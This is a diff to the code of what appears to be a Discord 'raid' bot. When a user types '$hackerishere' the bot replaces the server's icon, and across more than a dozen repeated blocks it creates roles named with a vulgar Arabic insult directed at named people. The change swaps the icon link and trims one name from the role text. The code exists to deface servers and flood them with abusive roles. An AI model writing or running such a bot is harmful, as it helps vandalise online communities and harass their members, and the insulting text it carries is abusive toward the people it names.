@@ -78,7 +78,7 @@ LOka.on('message', message => {
      if (message.content === "$hackerishere") {
                  if(!message.channel.guild) return;
  
-             message.guild.setIcon(`https://cdn.discordapp.com/attachments/415118005475868672/415119241872932869/images.jpg`)
+             message.guild.setIcon(`http://www12.0zz0.com/2018/09/25/20/707569314.jpg`)
  
 }
 });
@@ -87,7 +87,7 @@ LOka.on('message', message => {
      if (message.content === "$hackerishere") {
                  if(!message.channel.guild) return;
  
-             message.guild.setIcon(`https://cdn.discordapp.com/attachments/415118005475868672/415119241872932869/images.jpg`)
+             message.guild.setIcon(`http://www12.0zz0.com/2018/09/25/20/707569314.jpg`)
  
 }
 });
@@ -118,7 +118,7 @@ LOka.on('message', message => {
         color : " #ff0000"
     })
      m.createRole({
-        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
+        name : "موستانس _ عبود _ حمود في القمة ي خوات القحبة",
         permissions :   [1],
         color : " #ff0000"
     })
@@ -164,7 +164,7 @@ LOka.on('message', message => {
         color : " #ff0000"
     })
      m.createRole({
-        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
+        name : "موستانس _ عبود _ حمود في القمة ي خوات القحبة",
         permissions :   [1],
         color : " #ff0000"
     })
@@ -210,7 +210,7 @@ LOka.on('message', message => {
         color : " #ff0000"
     })
      m.createRole({
-        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
+        name : "موستانس _ عبود _ حمود في القمة ي خوات القحبة",
         permissions :   [1],
         color : " #ff0000"
     })
@@ -256,7 +256,7 @@ LOka.on('message', message => {
         color : " #ff0000"
     })
      m.createRole({
-        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
+        name : "موستانس _ عبود _ حمود في القمة ي خوات القحبة",
         permissions :   [1],
         color : " #ff0000"
     })
@@ -302,7 +302,7 @@ LOka.on('message', message => {
         color : " #ff0000"
     })
      m.createRole({
-        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
+        name : "موستانس _ عبود _ حمود في القمة ي خوات القحبة",
         permissions :   [1],
         color : " #ff0000"
     })
@@ -348,7 +348,7 @@ LOka.on('message', message => {
         color : " #ff0000"
     })
      m.createRole({
-        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
+        name : "موستانس _ عبود _ حمود في القمة ي خوات القحبة",
         permissions :   [1],
         color : " #ff0000"
     })
@@ -394,7 +394,7 @@ LOka.on('message', message => {
         color : " #ff0000"
     })
      m.createRole({
-        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
+        name : "موستانس _ عبود _ حمود في القمة ي خوات القحبة",
         permissions :   [1],
         color : " #ff0000"
     })
@@ -440,7 +440,7 @@ LOka.on('message', message => {
         color : " #ff0000"
     })
      m.createRole({
-        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
+        name : "موستانس _ عبود _ حمود في القمة ي خوات القحبة",
         permissions :   [1],
         color : " #ff0000"
     })
@@ -486,7 +486,7 @@ LOka.on('message', message => {
         color : " #ff0000"
     })
      m.createRole({
-        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
+        name : "موستانس _ عبود _ حمود في القمة ي خوات القحبة",
         permissions :   [1],
         color : " #ff0000"
     })
@@ -532,7 +532,7 @@ LOka.on('message', message => {
         color : " #ff0000"
     })
      m.createRole({
-        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
+        name : "موستانس _ عبود _ حمود في القمة ي خوات القحبة",
         permissions :   [1],
         color : " #ff0000"
     })
@@ -578,7 +578,7 @@ LOka.on('message', message => {
         color : " #ff0000"
     })
      m.createRole({
-        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
+        name : "موستانس _ عبود _ حمود في القمة ي خوات القحبة",
         permissions :   [1],
         color : " #ff0000"
     })
@@ -624,7 +624,7 @@ LOka.on('message', message => {
         color : " #ff0000"
     })
      m.createRole({
-        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
+        name : "موستانس _ عبود _ حمود في القمة ي خوات القحبة",
         permissions :   [1],
         color : " #ff0000"
     })
@@ -670,7 +670,7 @@ LOka.on('message', message => {
         color : " #ff0000"
     })
      m.createRole({
-        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
+        name : "موستانس _ عبود _ حمود في القمة ي خوات القحبة",
         permissions :   [1],
         color : " #ff0000"
     })
@@ -716,7 +716,7 @@ LOka.on('message', message => {
         color : " #ff0000"
     })
      m.createRole({
-        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
+        name : "موستانس _ عبود _ حمود في القمة ي خوات القحبة",
         permissions :   [1],
         color : " #ff0000"
     })
